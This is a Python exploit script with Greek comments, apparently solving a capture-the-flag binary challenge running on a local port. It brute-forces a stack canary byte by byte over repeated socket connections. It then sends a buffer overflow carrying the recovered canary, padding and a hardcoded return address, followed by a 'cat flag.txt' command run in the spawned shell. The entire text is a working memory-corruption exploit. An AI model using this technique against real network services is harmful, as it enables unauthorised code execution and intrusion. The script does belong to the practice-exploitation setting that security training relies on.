import socket

def get_canary():
    host, port = '127.0.0.1', 28285
    known_canary = b""
    # Βρίσκουμε τα 8 bytes του καναρινιού ένα-ένα
    for i in range(8):
        for b in range(256):
            test_byte = bytes([b])
            payload = b"A" * 122 + known_canary + test_byte
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((host, port))
                s.sendall(payload)
                res = s.recv(1024)
                if b"Stack smashing" not in res:
                    known_canary += test_byte
                    print(f"[+] Found byte {i}: {test_byte.hex()}")
                    s.close()
                    break
                s.close()
            except:
                continue
    return known_canary

# 1. Βρες το φρέσκο καναρίνι
canary = get_canary()

# 2. Χτύπα με το καναρίνι που μόλις βρήκες
if len(canary) == 8:
    print(f"[*] Live Canary: {canary.hex()}")
    # Δοκιμάζουμε το Junk 28 που δούλεψε τοπικά
    payload = b"A" * 122 + canary + b"A" * 28 + b"\x26\x92\x04\x08" + b"\ncat flag.txt; exit\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 28285))
    s.sendall(payload)
    print(s.recv(4096).decode(errors='ignore'))